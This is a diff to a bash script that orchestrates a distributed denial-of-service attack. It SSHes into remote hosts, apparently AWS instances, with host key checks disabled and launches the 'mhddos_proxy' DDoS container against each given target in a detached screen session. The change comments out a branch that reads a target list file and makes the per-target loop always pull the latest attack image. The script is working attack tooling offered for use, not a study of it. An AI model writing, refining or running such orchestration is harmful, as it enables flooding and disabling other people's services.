@@ -37,27 +37,27 @@ fire(){
 	local IP=${2}
 	shift 2
 
-	# Check whether -c is passed as a list with targets
-	if [[ ${1} == "-c" ]]
-	then
-		[[ -z ${2} ]] && exit 1
-
-		echo "    🔥 ${IP} » -c ${2}"
-		ssh \
-			-i ${KEY} \
-			-o "LogLevel ERROR" \
-			-o "IdentitiesOnly yes" \
-			-o "StrictHostKeyChecking no" \
-			-o "UserKnownHostsFile /dev/null" \
-			"ubuntu@${IP}" \
-				screen -dm \
-					sudo docker run \
-						-it \
-						--rm ghcr.io/porthole-ascend-cinnamon/mhddos_proxy \
-						--debug \
-						-c ${2}
-					# --rm --pull always ghcr.io/porthole-ascend-cinnamon/mhddos_proxy:latest
-	else
+#	# Check whether -c is passed as a list with targets
+#	if [[ ${1} == "-c" ]]
+#	then
+#		[[ -z ${2} ]] && exit 1
+#
+#		echo "    🔥 ${IP} » -c ${2}"
+#		ssh \
+#			-i ${KEY} \
+#			-o "LogLevel ERROR" \
+#			-o "IdentitiesOnly yes" \
+#			-o "StrictHostKeyChecking no" \
+#			-o "UserKnownHostsFile /dev/null" \
+#			"ubuntu@${IP}" \
+#				screen -dm \
+#					sudo docker run \
+#						-it \
+#						--rm \
+#						--pull always ghcr.io/porthole-ascend-cinnamon/mhddos_proxy:latest \
+#						--debug \
+#						-c ${2}
+#	else
 		for target in ${@}
 		do
 			echo "    🔥 ${IP} » ${target}"
@@ -71,12 +71,12 @@ fire(){
 					screen -dm \
 					sudo docker run \
 						-it \
-						--rm ghcr.io/porthole-ascend-cinnamon/mhddos_proxy \
+						--rm \
+						--pull always ghcr.io/porthole-ascend-cinnamon/mhddos_proxy:latest \
 						--debug \
 						${target}
-					# --rm --pull always ghcr.io/porthole-ascend-cinnamon/mhddos_proxy:latest
 		done
-	fi
+#	fi
 }
 
 ./checkAWS.sh && main ${@} || ./awsCliNa.sh
